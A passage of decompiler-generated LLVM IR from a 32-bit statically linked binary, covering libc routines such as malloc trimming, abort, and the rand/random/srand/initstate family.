  %v3_8061d6b = icmp eq i32 %v2_8061d6b, 0
  %v1_8061d6e = icmp eq i1 %v3_8061d6b, false
  br i1 %v1_8061d6e, label %dec_label_pc_8061e61, label %dec_label_pc_8061d74

dec_label_pc_8061d74:                             ; preds = %dec_label_pc_8061d6b
  %v1_8061d74 = or i32 %v1_8061d3a, 1
  %v3_8061d74 = trunc i32 %v1_8061d74 to i8
  store i32 %v1_8061d74, i32* %eax.global-to-local, align 4
  store i8 %v3_8061d74, i8* @global_var_80788d0.1607, align 16
  %v2_8061d7c = add i32 %v1_8061d41, %v1_8061d1e
  store i32 %v2_8061d7c, i32* @esi, align 4
  %v1_8061d7f = add i32 %v2_8061d7c, 4
  %v2_8061d7f = inttoptr i32 %v1_8061d7f to i32*
  %v3_8061d7f = load i32, i32* %v2_8061d7f, align 4
  store i32 %v3_8061d7f, i32* %eax.global-to-local, align 4
  %v2_8061d82 = inttoptr i32 %v1_8061d34 to i8*
  %v3_8061d82 = load i8, i8* %v2_8061d82, align 1
  %v4_8061d82 = urem i8 %v3_8061d82, 2
  %v5_8061d82 = icmp eq i8 %v4_8061d82, 0
  %v1_8061d8a = icmp eq i1 %v5_8061d82, false
  br i1 %v1_8061d8a, label %dec_label_pc_8061dad, label %dec_label_pc_8061d8c

dec_label_pc_8061d8c:                             ; preds = %dec_label_pc_8061d74
  %v2_8061d8c = inttoptr i32 %v1_8061d1e to i32*
  %v3_8061d8c = load i32, i32* %v2_8061d8c, align 4
  store i32 %v3_8061d8c, i32* @ebp, align 4
  %v2_8061d91 = sub i32 %v1_8061d1e, %v3_8061d8c
  store i32 %v2_8061d91, i32* %eax.global-to-local, align 4
  %v1_8061d93 = add i32 %v2_8061d91, 8
  %v2_8061d93 = inttoptr i32 %v1_8061d93 to i32*
  %v3_8061d93 = load i32, i32* %v2_8061d93, align 4
  store i32 %v3_8061d93, i32* %ebx.global-to-local, align 4
  %v1_8061d96 = add i32 %v2_8061d91, 12
  %v2_8061d96 = inttoptr i32 %v1_8061d96 to i32*
  %v3_8061d96 = load i32, i32* %v2_8061d96, align 4
  store i32 %v3_8061d96, i32* %edx.global-to-local, align 4
  %v1_8061d99 = add i32 %v3_8061d93, 12
  %v2_8061d99 = inttoptr i32 %v1_8061d99 to i32*
  %v3_8061d99 = load i32, i32* %v2_8061d99, align 4
  store i32 %v3_8061d99, i32* @edi, align 4
  %v12_8061d9c = icmp eq i32 %v3_8061d99, %v2_8061d91
  %v1_8061d9e = icmp eq i1 %v12_8061d9c, false
  br i1 %v1_8061d9e, label %dec_label_pc_8061dda, label %dec_label_pc_8061da0

dec_label_pc_8061da0:                             ; preds = %dec_label_pc_8061d8c
  %v1_8061da0 = add i32 %v3_8061d96, 8
  %v2_8061da0 = inttoptr i32 %v1_8061da0 to i32*
  %v3_8061da0 = load i32, i32* %v2_8061da0, align 4
  %v15_8061da0 = icmp eq i32 %v3_8061da0, %v3_8061d99
  %v1_8061da3 = icmp eq i1 %v15_8061da0, false
  br i1 %v1_8061da3, label %dec_label_pc_8061dda, label %dec_label_pc_8061da5

dec_label_pc_8061da5:                             ; preds = %dec_label_pc_8061da0
  %v2_8061da5 = add i32 %v3_8061d8c, %v1_8061d41
  store i32 %v2_8061da5, i32* @ecx, align 4
  store i32 %v3_8061d96, i32* %v2_8061d99, align 4
  %v0_8061daa = load i32, i32* %ebx.global-to-local, align 4
  %v1_8061daa = load i32, i32* %edx.global-to-local, align 4
  %v2_8061daa = add i32 %v1_8061daa, 8
  %v3_8061daa = inttoptr i32 %v2_8061daa to i32*
  store i32 %v0_8061daa, i32* %v3_8061daa, align 4
  %v0_8061db4.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8061dad

dec_label_pc_8061dad:                             ; preds = %dec_label_pc_8061d74, %dec_label_pc_8061da5
  %v1_8061dc0 = phi i32 [ %v2_8061d7c, %dec_label_pc_8061d74 ], [ %v0_8061db4.pre, %dec_label_pc_8061da5 ]
  %v1_8061db1 = and i32 %v3_8061d7f, -4
  store i32 %v1_8061db1, i32* @ebx, align 4
  %v1_8061db4 = load i32, i32* @global_var_80788fc.1609, align 4
  %v12_8061db4 = icmp eq i32 %v1_8061dc0, %v1_8061db4
  br i1 %v12_8061db4, label %dec_label_pc_8061e0c, label %dec_label_pc_8061dbc

dec_label_pc_8061dbc:                             ; preds = %dec_label_pc_8061dad
  %v2_8061dbc = add i32 %v1_8061dc0, 4
  %v3_8061dbc = add i32 %v2_8061dbc, %v1_8061db1
  %v4_8061dbc = inttoptr i32 %v3_8061dbc to i32*
  %v5_8061dbc = load i32, i32* %v4_8061dbc, align 4
  store i32 %v5_8061dbc, i32* %eax.global-to-local, align 4
  %v3_8061dc0 = inttoptr i32 %v2_8061dbc to i32*
  store i32 %v1_8061db1, i32* %v3_8061dc0, align 4
  %v0_8061dc3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061dc3 = urem i32 %v0_8061dc3, 2
  %v2_8061dc3 = icmp eq i32 %v1_8061dc3, 0
  store i32 %v1_8061dc3, i32* %eax.global-to-local, align 4
  %v1_8061dc8 = icmp eq i1 %v2_8061dc3, false
  br i1 %v1_8061dc8, label %dec_label_pc_8061de7, label %dec_label_pc_8061dca

dec_label_pc_8061dca:                             ; preds = %dec_label_pc_8061dbc
  %v0_8061dca = load i32, i32* @esi, align 4
  %v1_8061dca = add i32 %v0_8061dca, 8
  %v2_8061dca = inttoptr i32 %v1_8061dca to i32*
  %v3_8061dca = load i32, i32* %v2_8061dca, align 4
  store i32 %v3_8061dca, i32* %edx.global-to-local, align 4
  %v1_8061dcd = add i32 %v0_8061dca, 12
  %v2_8061dcd = inttoptr i32 %v1_8061dcd to i32*
  %v3_8061dcd = load i32, i32* %v2_8061dcd, align 4
  store i32 %v3_8061dcd, i32* %eax.global-to-local, align 4
  %v1_8061dd0 = add i32 %v3_8061dca, 12
  %v2_8061dd0 = inttoptr i32 %v1_8061dd0 to i32*
  %v3_8061dd0 = load i32, i32* %v2_8061dd0, align 4
  %v15_8061dd0 = icmp eq i32 %v3_8061dd0, %v0_8061dca
  %v1_8061dd3 = icmp eq i1 %v15_8061dd0, false
  br i1 %v1_8061dd3, label %dec_label_pc_8061dda, label %dec_label_pc_8061dd5

dec_label_pc_8061dd5:                             ; preds = %dec_label_pc_8061dca
  %v1_8061dd5 = add i32 %v3_8061dcd, 8
  %v2_8061dd5 = inttoptr i32 %v1_8061dd5 to i32*
  %v3_8061dd5 = load i32, i32* %v2_8061dd5, align 4
  %v15_8061dd5 = icmp eq i32 %v3_8061dd5, %v0_8061dca
  br i1 %v15_8061dd5, label %dec_label_pc_8061ddf, label %dec_label_pc_8061dda

dec_label_pc_8061dda:                             ; preds = %dec_label_pc_8061dd5, %dec_label_pc_8061dca, %dec_label_pc_8061da0, %dec_label_pc_8061d8c
  %v0_8061dda = call i32 @abort()
  store i32 %v0_8061dda, i32* %eax.global-to-local, align 4
  %v1_8061ddf.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8061ddf

dec_label_pc_8061ddf:                             ; preds = %dec_label_pc_8061dd5, %dec_label_pc_8061dda
  %v1_8061ddf = phi i32 [ %v3_8061dca, %dec_label_pc_8061dd5 ], [ %v1_8061ddf.pre, %dec_label_pc_8061dda ]
  %v0_8061ddf = phi i32 [ %v3_8061dcd, %dec_label_pc_8061dd5 ], [ %v0_8061dda, %dec_label_pc_8061dda ]
  %v2_8061ddf = add i32 %v1_8061ddf, 12
  %v3_8061ddf = inttoptr i32 %v2_8061ddf to i32*
  store i32 %v0_8061ddf, i32* %v3_8061ddf, align 4
  %v0_8061de2 = load i32, i32* @ecx, align 4
  %v1_8061de2 = load i32, i32* @ebx, align 4
  %v2_8061de2 = add i32 %v1_8061de2, %v0_8061de2
  store i32 %v2_8061de2, i32* @ecx, align 4
  %v0_8061de4 = load i32, i32* %edx.global-to-local, align 4
  %v1_8061de4 = load i32, i32* %eax.global-to-local, align 4
  %v2_8061de4 = add i32 %v1_8061de4, 8
  %v3_8061de4 = inttoptr i32 %v2_8061de4 to i32*
  store i32 %v0_8061de4, i32* %v3_8061de4, align 4
  br label %dec_label_pc_8061de7

dec_label_pc_8061de7:                             ; preds = %dec_label_pc_8061dbc, %dec_label_pc_8061ddf
  %v0_8061de7 = load i32, i32* @global_var_807890c.1611, align 4
  store i32 %v0_8061de7, i32* %eax.global-to-local, align 4
  %v0_8061dec = load i32, i32* @edi, align 4
  %v1_8061dec = add i32 %v0_8061dec, 12
  %v2_8061dec = inttoptr i32 %v1_8061dec to i32*
  store i32 ptrtoint (i32* @global_var_8078904.1613 to i32), i32* %v2_8061dec, align 4
  %v0_8061df3 = load i32, i32* @ecx, align 4
  %v1_8061df3 = load i32, i32* @edi, align 4
  %v3_8061df3 = add i32 %v1_8061df3, %v0_8061df3
  %v4_8061df3 = inttoptr i32 %v3_8061df3 to i32*
  store i32 %v0_8061df3, i32* %v4_8061df3, align 4
  %v0_8061df6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061df6 = load i32, i32* @edi, align 4
  %v2_8061df6 = add i32 %v1_8061df6, 8
  %v3_8061df6 = inttoptr i32 %v2_8061df6 to i32*
  store i32 %v0_8061df6, i32* %v3_8061df6, align 4
  %v0_8061df9 = load i32, i32* @edi, align 4
  %v1_8061df9 = load i32, i32* %eax.global-to-local, align 4
  %v2_8061df9 = add i32 %v1_8061df9, 12
  %v3_8061df9 = inttoptr i32 %v2_8061df9 to i32*
  store i32 %v0_8061df9, i32* %v3_8061df9, align 4
  %v0_8061dfc = load i32, i32* @ecx, align 4
  %v1_8061dfe = or i32 %v0_8061dfc, 1
  store i32 %v1_8061dfe, i32* %eax.global-to-local, align 4
  %v0_8061e01 = load i32, i32* @edi, align 4
  store i32 %v0_8061e01, i32* @global_var_807890c.1611, align 4
  %v2_8061e07 = add i32 %v0_8061e01, 4
  %v3_8061e07 = inttoptr i32 %v2_8061e07 to i32*
  store i32 %v1_8061dfe, i32* %v3_8061e07, align 4
  br label %dec_label_pc_8061e1c

dec_label_pc_8061e0c:                             ; preds = %dec_label_pc_8061dad
  %v0_8061e0c = load i32, i32* @ecx, align 4
  %v2_8061e0c = add i32 %v0_8061e0c, %v1_8061db1
  store i32 %v2_8061e0c, i32* @ecx, align 4
  %v1_8061e10 = or i32 %v2_8061e0c, 1
  store i32 %v1_8061e10, i32* %eax.global-to-local, align 4
  %v1_8061e13 = load i32, i32* @edi, align 4
  %v2_8061e13 = add i32 %v1_8061e13, 4
  %v3_8061e13 = inttoptr i32 %v2_8061e13 to i32*
  store i32 %v1_8061e10, i32* %v3_8061e13, align 4
  %v0_8061e16 = load i32, i32* @edi, align 4
  store i32 %v0_8061e16, i32* @global_var_80788fc.1609, align 4
  br label %dec_label_pc_8061e1c

dec_label_pc_8061e1c:                             ; preds = %dec_label_pc_8061de7, %dec_label_pc_8061e0c
  %v0_8061e1c = load i32, i32* @ecx, align 4
  %tmp = icmp ult i32 %v0_8061e1c, 131072
  br i1 %tmp, label %dec_label_pc_8061e81, label %dec_label_pc_8061e24

dec_label_pc_8061e24:                             ; preds = %dec_label_pc_8061e1c
  %v0_8061e24 = load i8, i8* @global_var_80788d0.1607, align 16
  %v1_8061e24 = and i8 %v0_8061e24, 2
  %v2_8061e24 = icmp eq i8 %v1_8061e24, 0
  br i1 %v2_8061e24, label %dec_label_pc_8061e3d, label %dec_label_pc_8061e2d

dec_label_pc_8061e2d:                             ; preds = %dec_label_pc_8061e24
  %v2_8061e35 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_80788d0.1607 to i32*))
  store i32 %v2_8061e35, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061e3d

dec_label_pc_8061e3d:                             ; preds = %dec_label_pc_8061e24, %dec_label_pc_8061e2d
  %v0_8061e3d = load i32, i32* @global_var_80788fc.1609, align 4
  store i32 %v0_8061e3d, i32* %eax.global-to-local, align 4
  %v1_8061e42 = add i32 %v0_8061e3d, 4
  %v2_8061e42 = inttoptr i32 %v1_8061e42 to i32*
  %v3_8061e42 = load i32, i32* %v2_8061e42, align 4
  %v1_8061e45 = and i32 %v3_8061e42, -4
  store i32 %v1_8061e45, i32* %eax.global-to-local, align 4
  %v1_8061e48 = load i32, i32* @global_var_8078c14.1626, align 4
  %v7_8061e48 = icmp ult i32 %v1_8061e45, %v1_8061e48
  br i1 %v7_8061e48, label %dec_label_pc_8061e81, label %dec_label_pc_8061e50

dec_label_pc_8061e50:                             ; preds = %dec_label_pc_8061e3d
  %v0_8061e50 = load i32, i32* @global_var_8078c18.1624, align 8
  store i32 %v0_8061e50, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_80788d0.1607 to i32), i32* @edx, align 4
  %v0_8061e5a = call i32 @__malloc_trim()
  store i32 %v0_8061e5a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061e81

dec_label_pc_8061e61:                             ; preds = %dec_label_pc_8061d6b
  %v2_8061e61 = inttoptr i32 %v1_8061d1e to i32*
  %v3_8061e61 = load i32, i32* %v2_8061e61, align 4
  store i32 %v3_8061e61, i32* %edx.global-to-local, align 4
  %v0_8061e64 = load i32, i32* @global_var_8078c20.1617, align 32
  %v1_8061e64 = add i32 %v0_8061e64, -1
  store i32 %v1_8061e64, i32* @global_var_8078c20.1617, align 32
  %v2_8061e6a = add i32 %v3_8061e61, %v1_8061d41
  store i32 %v2_8061e6a, i32* %eax.global-to-local, align 4
  %v2_8061e6d = sub i32 %v1_8061d1e, %v3_8061e61
  %v0_8061e73 = load i32, i32* @global_var_8078c34.1621, align 4
  %v2_8061e73 = sub i32 %v0_8061e73, %v2_8061e6a
  store i32 %v2_8061e73, i32* @global_var_8078c34.1621, align 4
  %v4_8061e79 = call i32 @munmap(i32 %v2_8061e6d, i32 %v2_8061e6a, i32 %v1_8061d41, i32 %v1_8061d41)
  store i32 %v4_8061e79, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061e81

dec_label_pc_8061e81:                             ; preds = %dec_label_pc_8061e3d, %dec_label_pc_8061e1c, %dec_label_pc_8061e50, %dec_label_pc_8061d48, %dec_label_pc_8061e61
  store i32 %v2_8061d19, i32* %eax.global-to-local, align 4
  %v3_8061e8a = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_8061e8a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061e92

dec_label_pc_8061e92:                             ; preds = %entry, %dec_label_pc_8061e81
  %.0 = phi i32 [ undef, %entry ], [ %v3_8061e8a, %dec_label_pc_8061e81 ]
  store i32 %v0_8061cfe, i32* @ebx, align 4
  store i32 %v0_8061cfd, i32* @esi, align 4
  store i32 %v0_8061cfc, i32* @edi, align 4
  store i32 %v0_8061cfb, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8061e61, { 1, 0, 2 }
  uselistorder i32 %v0_8061df3, { 1, 0 }
  uselistorder i32 %v1_8061dc3, { 1, 0 }
  uselistorder i32 %v2_8061dbc, { 1, 0 }
  uselistorder i32 %v1_8061db1, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8061dc0, { 1, 0 }
  uselistorder i32 %v2_8061d4d, { 1, 0 }
  uselistorder i32 %v1_8061d41, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8061d34, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8061d1e, { 1, 5, 0, 4, 2, 3, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* bitcast (i8* @global_var_80788d0.1607 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8078904.1613 to i32), { 1, 2, 3, 4, 5, 0, 6, 7, 8 }
  uselistorder i32 %arg1, { 0, 1, 4, 3, 2 }
  uselistorder label %dec_label_pc_8061e92, { 1, 0 }
  uselistorder label %dec_label_pc_8061e81, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8061e3d, { 1, 0 }
  uselistorder label %dec_label_pc_8061e1c, { 1, 0 }
  uselistorder label %dec_label_pc_8061de7, { 1, 0 }
  uselistorder label %dec_label_pc_8061ddf, { 1, 0 }
  uselistorder label %dec_label_pc_8061dad, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8061e9a = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8061ea7 = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_80788d0.1607 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_80788d0.1607 to i32), i32* @edx, align 4
  %v0_8061eb4 = load i32, i32* @ebx, align 4
  store i32 %v0_8061eb4, i32* @eax, align 4
  store i32 %v0_8061e9a, i32* @ebx, align 4
  %v0_8061eb7 = call i32 @__malloc_trim()
  ret i32 %v0_8061eb7

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_80788d0.1607 to i32), { 2, 1, 0 }
  uselistorder i8* @global_var_80788d0.1607, { 0, 5, 8, 7, 6, 3, 4, 1, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_8061ec5 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8071a10.1628 to i32))
  store i32 32, i32* %stack_var_-12, align 4
  %v2_8061edf = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_8061edf, i32* %eax.global-to-local, align 4
  %v3_8061ee6 = bitcast i32* %stack_var_-12 to %_TYPEDEF_sigset_t*
  %v4_8061ee6 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8061ee6, i32 0)
  store i32 %v4_8061ee6, i32* %eax.global-to-local, align 4
  %v0_8061eee = load i8, i8* @global_var_8077d70.1629, align 16
  %v1_8061eee = icmp eq i8 %v0_8061eee, 0
  %v1_8061ef5 = icmp eq i1 %v1_8061eee, false
  br i1 %v1_8061ef5, label %dec_label_pc_8061f26, label %dec_label_pc_8061ef7

dec_label_pc_8061ef7:                             ; preds = %entry
  store i8 1, i8* @global_var_8077d70.1629, align 16
  br label %dec_label_pc_8061efe

dec_label_pc_8061efe:                             ; preds = %dec_label_pc_8061f2f, %dec_label_pc_8061ef7
  %v1_8061f06 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8071a10.1628 to i32))
  store i32 %v1_8061f06, i32* %eax.global-to-local, align 4
  %v1_8061f12 = call i32 @__GI_raise(i32 6)
  store i32 %v1_8061f12, i32* %eax.global-to-local, align 4
  %v1_8061f1e = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8071a10.1628 to i32))
  store i32 %v1_8061f1e, i32* %eax.global-to-local, align 4
  %v0_8061f26.pre = load i8, i8* @global_var_8077d70.1629, align 16
  br label %dec_label_pc_8061f26

dec_label_pc_8061f26:                             ; preds = %entry, %dec_label_pc_8061efe
  %v2_8061f26 = phi i32 [ %v4_8061ee6, %entry ], [ %v1_8061f1e, %dec_label_pc_8061efe ]
  %v0_8061f26 = phi i8 [ %v0_8061eee, %entry ], [ %v0_8061f26.pre, %dec_label_pc_8061efe ]
  %v1_8061f26 = zext i8 %v0_8061f26 to i32
  %v3_8061f26 = and i32 %v2_8061f26, -256
  %v4_8061f26 = or i32 %v1_8061f26, %v3_8061f26
  store i32 %v4_8061f26, i32* %eax.global-to-local, align 4
  %v10_8061f2b = icmp eq i8 %v0_8061f26, 1
  %v1_8061f2d = icmp eq i1 %v10_8061f2b, false
  br i1 %v1_8061f2d, label %dec_label_pc_8061f63, label %dec_label_pc_8061f2f

dec_label_pc_8061f2f:                             ; preds = %dec_label_pc_8061f26
  %v2_8061f2f = ptrtoint i32* %stack_var_-32 to i32
  store i32 0, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_8077d70.1629, align 16
  store i32 0, i32* %stack_var_-32, align 4
  %v4_8061f3e = load i1, i1* @df, align 1
  %v5_8061f3e = select i1 %v4_8061f3e, i32 -4, i32 4
  %v6_8061f3e = add i32 %v5_8061f3e, %v2_8061f2f
  store i32 %v6_8061f3e, i32* %edi.global-to-local, align 4
  %v2_8061f3f = inttoptr i32 %v6_8061f3e to i32*
  store i32 0, i32* %v2_8061f3f, align 4
  %v3_8061f3f = load i32, i32* %edi.global-to-local, align 4
  %v6_8061f3f = add i32 %v3_8061f3f, %v5_8061f3e
  store i32 %v6_8061f3f, i32* %edi.global-to-local, align 4
  %v0_8061f40 = load i32, i32* %eax.global-to-local, align 4
  %v2_8061f40 = inttoptr i32 %v6_8061f3f to i32*
  store i32 %v0_8061f40, i32* %v2_8061f40, align 4
  %v3_8061f40 = load i32, i32* %edi.global-to-local, align 4
  %v6_8061f40 = add i32 %v3_8061f40, %v5_8061f3e
  store i32 %v6_8061f40, i32* %edi.global-to-local, align 4
  %v0_8061f41 = load i32, i32* %eax.global-to-local, align 4
  %v2_8061f41 = inttoptr i32 %v6_8061f40 to i32*
  store i32 %v0_8061f41, i32* %v2_8061f41, align 4
  %v3_8061f41 = load i32, i32* %edi.global-to-local, align 4
  %v6_8061f41 = add i32 %v3_8061f41, %v5_8061f3e
  store i32 %v6_8061f41, i32* %edi.global-to-local, align 4
  %v0_8061f42 = load i32, i32* %eax.global-to-local, align 4
  %v2_8061f42 = inttoptr i32 %v6_8061f41 to i32*
  store i32 %v0_8061f42, i32* %v2_8061f42, align 4
  %v4_8061f59 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-32, i32 0)
  store i32 %v4_8061f59, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061efe

dec_label_pc_8061f63:                             ; preds = %dec_label_pc_8061f26
  %v10_8061f63 = icmp eq i8 %v0_8061f26, 2
  %v1_8061f65 = icmp eq i1 %v10_8061f63, false
  br i1 %v1_8061f65, label %dec_label_pc_8061f6f, label %dec_label_pc_8061f67

dec_label_pc_8061f67:                             ; preds = %dec_label_pc_8061f63
  store i8 3, i8* @global_var_8077d70.1629, align 16
  br label %dec_label_pc_8061f6f

dec_label_pc_8061f6f:                             ; preds = %dec_label_pc_8061f63, %dec_label_pc_8061f67
  %v0_8061f6f = phi i8 [ %v0_8061f26, %dec_label_pc_8061f63 ], [ 3, %dec_label_pc_8061f67 ]
  %v9_8061f6f = icmp eq i8 %v0_8061f6f, 3
  %v1_8061f76 = icmp eq i1 %v9_8061f6f, false
  br i1 %v1_8061f76, label %dec_label_pc_8061f89, label %dec_label_pc_8061f78

dec_label_pc_8061f78:                             ; preds = %dec_label_pc_8061f6f
  store i8 4, i8* @global_var_8077d70.1629, align 16
  %v1_8061f84 = call i32 @__GI__exit(i32 127)
  store i32 %v1_8061f84, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061f89

dec_label_pc_8061f89:                             ; preds = %dec_label_pc_8061f6f, %dec_label_pc_8061f78, %dec_label_pc_8061f89
  br label %dec_label_pc_8061f89

; uselistorder directives
  uselistorder i8 %v0_8061f26, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i8* @global_var_8077d70.1629, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8061f89, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8061f6f, { 1, 0 }
  uselistorder label %dec_label_pc_8061f26, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_8061f8c = call i32 @random()
  ret i32 %v0_8061f8c

; uselistorder directives
  uselistorder i32 ()* @random, { 9, 4, 3, 2, 1, 0, 8, 7, 6, 5 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8061f94 = load i32, i32* @ebx, align 4
  store i32 %v0_8061f94, i32* %stack_var_-4, align 4
  %v2_8061fa2 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8061fa2, i32* @ebx, align 4
  %v4_8061fa7 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134623208, i32 ptrtoint (i32* @global_var_8071a28.1630 to i32))
  %v1_8061fb3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8071a28.1630 to i32))
  %v2_8061fba = ptrtoint i32* %stack_var_-8 to i32
  %v3_8061fc4 = call i32 @__GI_random_r(i32* nonnull @global_var_8071a40, i32 %v2_8061fba)
  %v3_8061fce = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v3_8061fd3 = load i32, i32* %stack_var_-8, align 4
  %v2_8061fda = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061fda, i32* @ebx, align 4
  ret i32 %v3_8061fd3
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v4_8061ff1 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134623208, i32 ptrtoint (i32* @global_var_8071a28.1630 to i32))
  %v1_8061ffd = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8071a28.1630 to i32))
  store i32 0, i32* @ebx, align 4
  store i32 ptrtoint (i32** @global_var_8071a44.1634 to i32), i32* @esi, align 4
  %v3_8062018 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_8071a40)
  %v2_8062021 = icmp slt i32 %v3_8062018, 0
  %v1_8062024 = icmp eq i1 %v2_8062021, false
  %v2_8062024 = load i32, i32* @ebx, align 4
  %v3_8062024 = load i32, i32* @esi, align 4
  %v4_8062024 = select i1 %v1_8062024, i32 %v3_8062024, i32 %v2_8062024
  %v3_8062027 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  ret i32 %v4_8062024
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_8062044 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8062044, i32* @ebx, align 4
  %v4_8062049 = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134623208, i32 ptrtoint (i32* @global_var_8071a28.1630 to i32))
  %v1_8062055 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8071a28.1630 to i32))
  store i32 ptrtoint (i32** @global_var_8071a44.1634 to i32), i32* @esi, align 4
  %v4_8062074 = inttoptr i32 %arg2 to i32*
  %v5_8062074 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_8062074, i32 %arg3, i32 ptrtoint (i32* @global_var_8071a40 to i32))
  %v3_806207f = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_8062087 = load i32, i32* @esi, align 4
  ret i32 %v0_8062087
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_806208c = load i32, i32* @ebx, align 4
  store i32 %v0_806208c, i32* %stack_var_-4, align 4
  %v2_806209a = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_806209a, i32* @ebx, align 4
  %v4_806209f = call i32 @_pthread_cleanup_push_defer(i32* nonnull %stack_var_-20, i32 134623208, i32 ptrtoint (i32* @global_var_8071a28.1630 to i32))
  %v1_80620ab = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8071a28.1630 to i32))
  %v3_80620bb = call i32 @srandom_r(i32 %arg1, i32* nonnull @global_var_8071a40)
  %v3_80620c5 = call i32 @_pthread_cleanup_pop_restore(i32* nonnull %stack_var_-20, i32 1)
  %v2_80620cd = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80620cd, i32* @ebx, align 4
  ret i32 %v3_80620c5

; uselistorder directives
  uselistorder i32* @global_var_8071a40, { 0, 3, 1, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8071a28.1630 to i32), { 4, 0, 5, 1, 6, 2, 7, 3 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_80620d3 = load i32, i32* @ebx, align 4
  store i32 %v0_80620d3, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_80620dc = add i32 %tmp3, 12
  %v2_80620dc = inttoptr i32 %v1_80620dc to i8*
  %v3_80620dc = load i8, i8* %v2_80620dc, align 1
  %v4_80620dc = icmp eq i8 %v3_80620dc, 0
  %v1_80620e0 = add i32 %tmp3, 8
  %v2_80620e0 = inttoptr i32 %v1_80620e0 to i32*
  %v3_80620e0 = load i32, i32* %v2_80620e0, align 4
  store i32 %v3_80620e0, i32* %esi.global-to-local, align 4
  %v1_80620e3 = icmp eq i1 %v4_80620dc, false
  br i1 %v1_80620e3, label %dec_label_pc_80620fc, label %dec_label_pc_80620e5

dec_label_pc_80620e5:                             ; preds = %entry
